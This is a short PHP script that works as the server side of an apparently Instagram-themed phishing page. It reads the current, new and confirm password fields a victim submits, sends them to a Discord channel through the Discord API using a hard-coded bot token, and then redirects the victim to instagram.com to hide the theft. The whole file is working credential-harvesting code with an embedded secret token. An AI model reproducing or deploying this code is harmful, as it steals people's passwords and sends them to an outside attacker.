<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $currentPassword = $_POST["current_password"];
    $newPassword = $_POST["new_password"];
    $confirmPassword = $_POST["confirm_password"];

    // Discord Bot Token
    $botToken = "MTEyMzkyOTAwMjc4OTMwNjQwOA.G6py0U.DxQW4O80PlfxnPuyrtqVIKSR1GHGkcuYFYsQiY";
    $channelId = "1123927902904406098";

    // Prepare the message content

    $message = "Current Password: $currentPassword\n";
    $message .= "New Password: $newPassword\n";
    $message .= "Confirm Password: $confirmPassword\n";
    $message .= "-----------------------------------------------------------------\n";

    // Set up the API endpoint URL
    $url = "https://discord.com/api/v10/channels/$channelId/messages";

    // Set up the headers with authorization
    $headers = array(
        "Authorization: Bot $botToken",
        "Content-Type: application/json"
    );

    // Set up the data payload
    $data = array(
        "content" => $message
    );

    // Convert the data to JSON format
    $jsonData = json_encode($data);

    // Set up the cURL request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);

    // Execute the cURL request
    $response = curl_exec($ch);

    // Close the cURL session
    curl_close($ch);

    // Check if the request was successful
    if ($response === false) {
        echo "Failed to send data to Discord channel.";
    }
    ?>

    <script>
        // Redirect to Instagram using JavaScript
        window.location.href = "https://www.instagram.com/";
    </script>

    <?php
    exit; // Terminate the script execution
}
?>
